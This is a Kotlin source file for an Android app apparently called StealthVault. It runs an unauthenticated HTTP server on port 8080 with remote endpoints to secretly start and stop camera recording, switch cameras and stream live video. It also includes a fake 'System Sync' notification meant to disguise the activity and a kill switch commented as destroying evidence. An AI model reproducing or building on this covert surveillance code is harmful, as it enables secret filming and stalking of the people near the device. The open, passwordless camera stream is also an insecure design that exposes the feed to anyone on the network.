package com.stealth.evidence.ui

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.app.NotificationCompat
import io.ktor.http.ContentType
import io.ktor.server.application.call
import io.ktor.server.engine.embeddedServer
import io.ktor.server.netty.Netty
import io.ktor.server.netty.NettyApplicationEngine
import io.ktor.server.response.header
import io.ktor.server.response.respondOutputStream
import io.ktor.server.response.respondText
import io.ktor.server.routing.get
import io.ktor.server.routing.routing
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlin.system.exitProcess

class EmbeddedServer(private val appContext: Context) {
    private var server: NettyApplicationEngine? = null

    fun start() {
        CoroutineScope(Dispatchers.IO).launch {
            server = embeddedServer(Netty, port = 8080) {
                routing {
                    get("/") {
                        call.respondText("StealthVault Server is running")
                    }
                    
                    // 遠隔：録画（Vaultへの保存）開始
                    get("/start") {
                        val intent = Intent(appContext, StealthCameraService::class.java).apply {
                            action = StealthCameraService.ACTION_START_RECORDING
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            appContext.startForegroundService(intent)
                        } else {
                            appContext.startService(intent)
                        }
                        call.respondText("Recording to Vault started")
                    }
                    
                    // 遠隔：録画（Vaultへの保存）停止
                    get("/stop") {
                        val intent = Intent(appContext, StealthCameraService::class.java).apply {
                            action = StealthCameraService.ACTION_STOP_RECORDING
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            appContext.startForegroundService(intent)
                        } else {
                            appContext.startService(intent)
                        }
                        call.respondText("Recording to Vault stopped")
                    }

                    // 遠隔：カメラの向き切り替え
                    get("/switch") {
                        val intent = Intent(appContext, StealthCameraService::class.java).apply {
                            action = StealthCameraService.ACTION_SWITCH_CAMERA
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            appContext.startForegroundService(intent)
                        } else {
                            appContext.startService(intent)
                        }
                        call.respondText("Camera switched")
                    }

                    // 遠隔：カモフラージュ通知送信
                    get("/notify") {
                        sendCamouflageNotification()
                        call.respondText("Camouflage notification sent")
                    }

                    // 遠隔：アプリ強制キル（証拠隠滅）
                    get("/kill") {
                        call.respondText("Executing Kill Switch...")
                        Thread.sleep(500)
                        exitProcess(0)
                    }

                    // 映像ストリーミング（MJPEG配信）
                    get("/stream") {
                        call.response.header("Cache-Control", "no-cache")
                        call.respondOutputStream(ContentType.parse("multipart/x-mixed-replace; boundary=--myboundary")) {
                            try {
                                while (true) {
                                    val jpeg = StealthCameraService.latestJpeg
                                    if (jpeg != null) {
                                        write("--myboundary\r\n".toByteArray())
                                        write("Content-Type: image/jpeg\r\n".toByteArray())
                                        write("Content-Length: ${jpeg.size}\r\n\r\n".toByteArray())
                                        write(jpeg)
                                        write("\r\n".toByteArray())
                                        flush()
                                    }
                                    Thread.sleep(100) // 10fps
                                }
                            } catch (e: Exception) {
                            }
                        }
                    }
                }
            }
            server?.start(wait = true)
        }
    }

    private fun sendCamouflageNotification() {
        val channelId = "camouflage_channel"
        val notificationManager = appContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Background Sync",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            notificationManager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(appContext, channelId)
            .setContentTitle("システム同期")
            .setContentText("同期を開始しました (バックグラウンド処理中)")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setAutoCancel(true)
            .build()

        notificationManager.notify(999, notification)
    }

    fun stop() {
        server?.stop(1000, 2000)
    }
}
